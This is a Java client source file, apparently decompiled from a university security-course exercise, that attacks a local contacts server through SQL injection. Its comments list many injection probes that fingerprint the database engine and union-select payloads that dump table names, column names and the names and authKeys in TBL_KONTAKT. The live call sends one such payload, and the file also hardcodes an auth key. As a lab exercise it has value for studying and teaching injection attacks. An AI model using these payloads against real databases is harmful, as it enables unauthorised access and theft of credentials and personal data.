package at.ac.tuwien.inso.esse.advancedsecsys.client;

import java.security.Security;
import java.util.List;

import org.bouncycastle.jce.provider.BouncyCastleProvider;

import at.ac.tuwien.inso.esse.advancedsecsys.client.dto.Entry;
import at.ac.tuwien.inso.esse.advancedsecsys.client.transfer.ServerBackend;

public class Main {
	private static final String AUTHKEY = "b2c22c650";

	public static void main(String[] args) {
		Security.addProvider(new BouncyCastleProvider());

		ServerBackend localServerBackend = new ServerBackend();
		try {
			localServerBackend.connect("127.0.0.1", 8080);
			//' and soundex('name')=soundex('name')--
			//SELECT * FROM TABLE(ID INT=(1, 2), NAME VARCHAR=('Hello', 'World'))  -- false no firebird
			// and database() like '%sec%' 
			//database() like '%'   true -- no soliddb, derby
			//current_database()   -- false no postgres
			
			//user() like '%' -- true mysql
			//current_user() like '%' -- false no mysql
			
			//VERSION() like '%'  -- false no mysql
			
			//' and locate('.', 'l.sd') < 10 --    true    -> mysql, no vistaDB
			//' position('.', 'l.sd') < 10 --  false  -> no h2
			//' and charindex('.', 'l.sd') < 10  -- false  -> no ms sql
			//' and concat('a','b')='ab' -- true 
			//' and cast('1' AS integer)=1 -- true
			//' and LENGTH(COMPRESS('')) < 10   -- false no mysql
			//' and FORMAT(12332.1,4)='12,332.1000' -- false no mysql
			//' and 'A'=(select chr(65) from sysibm.sysdummy1;)  -- false no db2
			//' and substr(‘abc’, 2, 1)='b'  -- false no ingres, sqlite
			//' and sqlite_version() like '%' -- false no sqlite
			//' and substr(‘aaa’, 1)='aaa'   -- false no h2, sqlite, derby, oracle ..
			//' and substring(‘aaa’ from 3 for 1)='a'  -- false no firebird
			//' and SUBSTRING('Quadratically',5)='ratically'  -- true mysql
			//' and SUBSTRING('foobarbar' FROM 4)='barbar' -- true mysql, no db2
			//' and name = name  -- true
			//' and telnr = telnr -- true
			//' and authKey = authKey -- true
			//' and wort = wort  -- false
			//' and greatest(1,2,3)=3 --   true hsqldb
			//' and DATABASE_VERSION() like '%' --  true hsqldb
			// union select * from values('sdfkj','Horst','023434')
			//' and DATABASE_VERSION() = '2.2.9'  --
			//SELECT * FROM UNNEST(SEQUENCE_ARRAY(10, 12, 1))
			//union select NULL FROM INFORMATION_SCHEMA.SYSTEM_TABLES where TABLE_TYPE='TABLE'
			//' and authKey != 'b2c22c650sf1234567' and length(authKey)=9
			//123456889012345689012345689012345689012341234123412322'--   max length = 57
			//sdfsdf' union select table_name,'a' FROM INFORMATION_SCHEMA.TABLES where TABLE_TYPE='BASE TABLE'--
			//' union select column_name,data_type FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='TBL_KONTAKT'--
			//sdfsdf' union select name,authkey from TBL_KONTAKT--
			List<Entry> entries = (List<Entry>) localServerBackend.queryForName("sdfsdf' union select table_name,'' FROM INFORMATION_SCHEMA.TABLES--", AUTHKEY);
			if ((entries != null) && (entries.size() > 0)) {
				for (Entry e : entries) {
					System.out.print(e.getName());
					if (e.getTelnr() != null) {
						System.out.println(" " + e.getTelnr());
					}
					else {
						System.out.println();
					}
				}
			}
			else {
				System.out.println("No entries received");
			}
			localServerBackend.close();
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

}

/* Location:           secure-client-dex2jar.jar
 * Qualified Name:     at.ac.tuwien.inso.esse.advancedsecsys.client.Main
 * JD-Core Version:    0.6.2
 */